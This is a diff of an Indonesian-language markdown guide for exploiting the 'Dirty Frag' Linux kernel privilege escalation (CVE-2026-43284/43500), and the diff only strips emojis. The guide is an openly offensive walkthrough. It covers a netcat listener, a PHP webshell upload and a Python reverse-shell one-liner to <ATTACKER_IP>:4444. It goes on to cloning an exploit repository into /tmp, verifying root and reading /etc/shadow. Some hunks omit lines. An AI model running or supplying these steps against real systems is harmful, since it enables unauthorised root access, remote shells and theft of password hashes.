@@ -1,16 +1,16 @@
-# 💥 DirtyFrag — Local Privilege Escalation (CVE‑2026‑43284 / CVE‑2026‑43500)
+﻿# DirtyFrag — Local Privilege Escalation (CVE‑2026‑43284 / CVE‑2026‑43500)
 
 > **Tujuan:** Mengeksploitasi celah kernel **Dirty Frag** untuk naik dari user terbatas (mis. `www-data`) ke **root**.
 
 ---
 
-## 📌 Penjelasan Singkat
+## Penjelasan Singkat
 
 **Dirty Frag** adalah kerentanan **LPE** pada Linux kernel (versi 5.8‑5.15) yang memanfaatkan fragmentasi memori heap kernel. Dengan meng‑trigger bug ini, attacker dapat menulis nilai‑nilai arbitrer ke memori kernel dan meng‑escalasi privilege menjadi **root** tanpa memerlukan kredensial tambahan.
 
 ---
 
-## 🛡️ Prerequisite Checks (Validasi Awal)
+## Prerequisite Checks (Validasi Awal)
 
 ### 1. Identitas User Saat Ini
 
@@ -25,7 +25,7 @@ whoami
 uname -r
 ```
 
-> ⚠️ **Catatan:** Dirty Frag berlaku untuk kernel **5.8 – 5.15.x** sebelum dipatch. Jika versi di luar rentang atau sudah dipatch, eksploit tidak akan berhasil.
+>  **Catatan:** Dirty Frag berlaku untuk kernel **5.8 – 5.15.x** sebelum dipatch. Jika versi di luar rentang atau sudah dipatch, eksploit tidak akan berhasil.
 
 ### 3. Tools yang Diperlukan — `gcc`, `git`
 
@@ -37,7 +37,7 @@ which gcc git
 
 ---
 
-## 🎧 Persiapan Listener (Attacker)
+## Persiapan Listener (Attacker)
 
 ```bash
 nc -lvnp 4444
@@ -45,9 +45,9 @@ nc -lvnp 4444
 
 ---
 
-## 📥 Akses Awal ke Target
+## Akses Awal ke Target
 
-### A️⃣ File Upload (Webshell)
+### A File Upload (Webshell)
 
 Buat `shell.php`:
 
@@ -61,7 +61,7 @@ Upload lewat aplikasi web, lalu akses:
 curl http://<TARGET>/uploads/shell.php
 ```
 
-### B️⃣ Command Injection (Python Reverse Shell)
+### B Command Injection (Python Reverse Shell)
 
 ```bash
 python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
@@ -69,7 +69,7 @@ python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<ATTACKER_IP>",44
 
 ---
 
-## 📂 Working Directory (`/tmp`)
+## Working Directory (`/tmp`)
 
 Setelah shell didapatkan, pindah ke direktori **world‑writable**:
 
@@ -81,7 +81,7 @@ cd /tmp
 
 ---
 
-## 📂 Exploit Dirty Frag
+## Exploit Dirty Frag
 
 ### 1. Clone Repository
 
@@ -106,7 +106,7 @@ Jika berhasil, proses akan memunculkan **root shell**.
 
 ---
 
-## ✅ Verifikasi Hak Root
+## Verifikasi Hak Root
 
 ```bash
 id
@@ -124,7 +124,7 @@ root:$6$...:...
 
 ---
 
-## 🪜 Alur Eksploitasi
+## Alur Eksploitasi
 
 ```text
 Validasi kernel (uname -r)
@@ -142,7 +142,7 @@ Verifikasi root (id)
 
 ---
 
-## 📋 Checklist Dirty Frag
+## Checklist Dirty Frag
 
 - [ ] Pastikan kernel target rentan (5.8‑5.15).
 - [ ] Cek `gcc`/`git` atau compile lokal lalu upload binary.
@@ -154,7 +154,7 @@ Verifikasi root (id)
 
 ---
 
-## 📚 Referensi
+## Referensi
 
 - [Dirty Frag – CVE‑2026‑43284 / CVE‑2026‑43500](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-43284)
 - [GitHub – dirtyfrag exploit](https://github.com/V4bel/dirtyfrag)
